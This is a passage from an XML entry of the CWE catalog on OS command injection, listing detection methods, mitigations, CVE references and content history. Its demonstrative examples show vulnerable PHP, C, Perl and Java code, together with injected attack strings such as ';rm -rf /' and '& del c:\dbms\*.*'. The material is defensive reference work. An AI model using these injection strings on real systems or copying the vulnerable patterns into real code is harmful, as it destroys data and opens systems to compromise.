                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If at all possible, use library calls rather than external processes to recreate the desired functionality.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.3">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>
                  <xhtml:p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</xhtml:p>
                  <xhtml:p>Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When constructing OS command strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ";" and "&gt;" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.</xhtml:p>
                  <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Compilation or Build Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                  <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
                  <xhtml:p>In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>Use runtime policy enforcement to create an allowlist of allowable commands, then prevent use of any command that does not appear in the allowlist. Technologies such as AppArmor are available to do this.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-151">
               <Intro_Text>This example code intends to take the name of a user and list the contents of that user's home directory. It is subject to the first variant of OS command injection.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$userName = $_POST["user"];<xhtml:br/>$command = 'ls -l /home/' . $userName;<xhtml:br/>system($command);</xhtml:div>
               </Example_Code>
               <Body_Text>The $userName variable is not checked for malicious input. An attacker could set the $userName variable to an arbitrary OS command such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>;rm -rf /</xhtml:div>
               </Example_Code>
               <Body_Text>Which would result in $command being:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>ls -l /home/;rm -rf /</xhtml:div>
               </Example_Code>
               <Body_Text>Since the semi-colon is a command separator in Unix, the OS would first execute the ls command, then the rm command, deleting the entire file system.</Body_Text>
               <Body_Text>Also note that this example code is vulnerable to Path Traversal (CWE-22) and Untrusted Search Path (CWE-426) attacks.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-30">
               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int main(int argc, char** argv) {<xhtml:div style="margin-left:1em;">char cmd[CMD_MAX] = "/usr/bin/cat ";<xhtml:br/>strcat(cmd, argv[1]);<xhtml:br/>system(cmd);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
               <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example is a web application that intends to perform a DNS lookup of a user-supplied domain name. It is subject to the first variant of OS command injection.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>use CGI qw(:standard);<xhtml:br/>$name = param('name');<xhtml:br/>$nslookup = "/path/to/nslookup";<xhtml:br/>print header;<xhtml:br/>if (open($fh, "$nslookup $name|")) {<xhtml:div style="margin-left:1em;">while (&lt;$fh&gt;) {<xhtml:div style="margin-left:1em;">print escapeHTML($_);<xhtml:br/>print "&lt;br&gt;\n";</xhtml:div>}<xhtml:br/>close($fh);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Suppose an attacker provides a domain name like this:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>cwe.mitre.org%20%3B%20/bin/ls%20-l</xhtml:div>
               </Example_Code>
               <Body_Text>The "%3B" sequence decodes to the ";" character, and the %20 decodes to a space. The open() statement would then process a string like this:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>/path/to/nslookup cwe.mitre.org ; /bin/ls -l</xhtml:div>
               </Example_Code>
               <Body_Text>As a result, the attacker executes the "/bin/ls -l" command and gets a list of all the files in the program's working directory. The input could be replaced with much more dangerous commands, such as installing a malicious program on the server.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-13">
               <Intro_Text>The example below reads the name of a shell script to execute from the system properties. It is subject to the second variant of OS command injection.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String script = System.getProperty("SCRIPTNAME");<xhtml:br/>if (script != null)<xhtml:div style="margin-left:1em;">System.exec(script);</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>If an attacker has control over this property, then they could modify the property to point to a dangerous program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-14">
               <Intro_Text>In the example below, a method is used to transform geographic coordinates from latitude and longitude format to UTM format. The method gets the input coordinates from a user through a HTTP request and executes a program local to the application server that performs the transformation. The method passes the latitude and longitude coordinates as a command-line option to the external program and will perform some processing to retrieve the results of the transformation and return the resulting UTM coordinates.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public String coordinateTransformLatLonToUTM(String coordinates)<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                        <xhtml:div>String utmCoords = null;<xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>String latlonCoords = coordinates;<xhtml:br/>Runtime rt = Runtime.getRuntime();<xhtml:br/>Process exec = rt.exec("cmd.exe /C latlon2utm.exe -" + latlonCoords);<xhtml:br/>
                                 <xhtml:i>// process results of coordinate transform</xhtml:i>
                                 <xhtml:br/>
                                 <xhtml:br/>
                                 <xhtml:i>// ...</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>}<xhtml:br/>catch(Exception e) {...}<xhtml:br/>return utmCoords;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, the method does not verify that the contents of the coordinates input parameter includes only correctly-formatted latitude and longitude coordinates. If the input coordinates were not validated prior to the call to this method, a malicious user could execute another program local to the application server by appending '&amp;' followed by the command for another program to the end of the coordinate string. The '&amp;' instructs the Windows operating system to execute another program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-28">
               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:1em;">c:\\util\\rmanDB.bat "<xhtml:br/>+btype+<xhtml:br/>"&amp;&amp;c:\\utl\\cleanup.bat\"")</xhtml:div>
                     <xhtml:br/>System.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2020-10987</Reference>
               <Description>OS command injection in Wi-Fi router, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-10987</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-10221</Reference>
               <Description>Template functionality in network configuration management tool allows OS command injection, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-10221</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-9054</Reference>
               <Description>Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0067</Reference>
               <Description>Canonical example of OS command injection. CGI program does not neutralize "|" metacharacter when invoking a phonebook program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0067</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1246</Reference>
               <Description>Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1246</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0061</Reference>
               <Description>Web server allows command execution using "|" (pipe) character.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0061</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0041</Reference>
               <Description>FTP client does not filter "|" from filenames returned by the server, allowing for OS command injection.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0041</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2575</Reference>
               <Description>Shell metacharacters in a filename in a ZIP archive</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2575</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1898</Reference>
               <Description>Shell metacharacters in a telnet:// link are not properly handled when the launching application processes the link.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1898</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4304</Reference>
               <Description>OS command injection through environment variable.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4304</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4796</Reference>
               <Description>OS command injection through https:// URLs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4796</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3572</Reference>
               <Description>Chain: incomplete denylist for OS command injection</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3572</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-1988</Reference>
               <Description>Product allows remote users to execute arbitrary commands by creating a file whose pathname contains shell metacharacters.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-1988</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Program Invocation</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>System Process</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>OS Command Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV03-C</Entry_ID>
               <Entry_Name>Sanitize the environment when invoking external programs</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV33-C</Entry_ID>
               <Entry_Name>Do not call system()</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR02-C</Entry_ID>
               <Entry_Name>Sanitize data passed to complex subsystems</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>31</Entry_ID>
               <Entry_Name>OS Commanding</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>IDS07-J</Entry_ID>
               <Entry_Name>Do not pass untrusted, unsanitized data to the Runtime.exec() method</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-78</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="6"/>
            <Related_Attack_Pattern CAPEC_ID="88"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-140"/>
            <Reference External_Reference_ID="REF-685"/>
            <Reference External_Reference_ID="REF-686"/>
            <Reference External_Reference_ID="REF-687" Section="chapter: &#34;CGI Scripts&#34;"/>
            <Reference External_Reference_ID="REF-688"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 10: Command Injection.&#34; Page 171"/>
            <Reference External_Reference_ID="REF-690"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 8, &#34;Shell Metacharacters&#34;, Page 425"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-78"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Terminology">The "OS command injection" phrase carries different meanings to different people. For some people, it only refers to cases in which the attacker injects command separators into arguments for an application-controlled program that is being invoked. For some people, it refers to any type of attack that can allow the attacker to execute OS commands of their own choosing. This usage could include untrusted search path weaknesses (CWE-426) that cause the application to find and execute an attacker-controlled program. Further complicating the issue is the case when argument injection (CWE-88) allows alternate command-line switches or options to be inserted into the command line, such as an "-exec" switch whose purpose may be to execute the subsequent argument as a command (this -exec switch exists in the UNIX "find" command, for example). In this latter case, however, CWE-88 could be regarded as the primary weakness in a chain with CWE-78.</Note>
            <Note Type="Research Gap">More investigation is needed into the distinction between the OS command injection variants, including the role with argument injection (CWE-88). Equivalent distinctions may exist in other injection-related problems such as SQL injection.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships, Research_Gaps, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Name, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
